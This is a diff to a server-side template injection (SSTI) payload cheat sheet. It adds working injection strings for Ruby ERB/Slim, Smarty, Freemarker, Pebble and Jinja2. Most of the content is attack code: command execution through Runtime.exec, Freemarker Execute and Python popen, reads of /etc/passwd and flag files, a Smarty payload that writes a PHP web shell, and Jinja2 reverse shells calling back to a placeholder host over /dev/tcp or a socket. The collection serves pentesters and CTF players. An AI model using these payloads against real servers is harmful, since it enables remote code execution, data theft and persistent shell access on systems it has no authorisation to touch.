@@ -7,7 +7,7 @@
 * [Tools](#tools)
 * [Methodology](#methodology)
 * [Ruby](#ruby)
-  * [Basic injection](#basic-injection)
+  * [Basic injections](#basic-injections)
   * [Retrieve /etc/passwd](#retrieve--etc-passwd)
   * [List files and directories](#list-files-and-directories)
 * [Java](#java)
@@ -20,6 +20,11 @@
   * [Code execution](#code-execution)
 * [Smarty](#smarty)
 * [Freemarker](#freemarker)
+  * [Basic injection](#basic-injection)
+  * [Code execution](#code-execution)
+* [Peeble](#peeble)
+  * [Basic injection](#basic-injection)
+  * [Code execution](#code-execution)
 * [Jade / Codepen](#jade---codepen)
 * [Velocity](#velocity)
 * [Mako](#mako)
@@ -35,6 +40,7 @@
 * [Jinjava](#jinjava)
   * [Basic injection](#basic-injection)
   * [Command execution](#command-execution)
+* [References](#references)
 
 ## Tools
 
@@ -49,14 +55,22 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ## Methodology
 
-![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20injections/Images/serverside.png?raw=true)
+![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)
 
 ## Ruby
 
-### Basic injection
+### Basic injections
+
+ERB:
 
 ```ruby
 <%= 7 * 7 %>
+```
+
+Slim:
+
+```ruby
+#{ 7 * 7 }
 ```
 
 ### Retrieve /etc/passwd
@@ -69,6 +83,14 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ```ruby
 <%= Dir.entries('/') %>
+```
+
+### Code execution
+
+Execute code using SSTI for Slim engine.
+
+```powershell
+#{ %x|env| }
 ```
 
 ## Java
@@ -131,17 +153,50 @@ $output = $twig > render (
 ## Smarty
 
 ```python
+{$smarty.version}
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 ```
 
 ## Freemarker
 
-Default functionality.
+You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
 
-```python
-<#assign
-ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+### Basic injection
+
+The template can be `${3*3}` or the legacy `#{3*3}`
+
+### Code execution
+
+```js
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+```
+
+## Pebble
+
+### Basic injection
+
+```java
+{{ someString.toUPPERCASE() }}
+```
+
+### Code execution
+
+```java
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
 ```
 
 ## Jade / Codepen
@@ -179,13 +234,14 @@ ${x}
 ## Jinja2
 
 [Official website](http://jinja.pocoo.org/)
-> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
+> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
-### Basic injection
+### Basic injection
 
 ```python
 {{4*4}}[[5*5]]
 {{7*'7'}} would result in 7777777
+{{config.items()}}
 ```
 
 Jinja2 is used by Python Web Frameworks such as Django or Flask.
@@ -227,6 +283,7 @@ The above injections have been tested on Flask application.
 ```python
 # ''.__class__.__mro__[2].__subclasses__()[40] = File class
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
 ```
 
 ### Write into remote file
@@ -243,13 +300,33 @@ Listen for connexion
 nv -lnvp 8000
 ```
 
-Inject this template
+#### Exploit the SSTI by calling subprocess.Popen.
+:warning: the number 396 will vary depending of the application.
 
 ```python
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
-{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
-{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
+
+#### Exploit the SSTI by calling Popen without guessing the offset
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+#### Exploit the SSTI by writing an evil config file.
+
+```python
+# evil config
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+
+# load the evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+
+# connect to evil host
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
+```
+
 
 ### Filter bypass
 
@@ -325,3 +402,4 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
 * [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
 * [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
+* [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
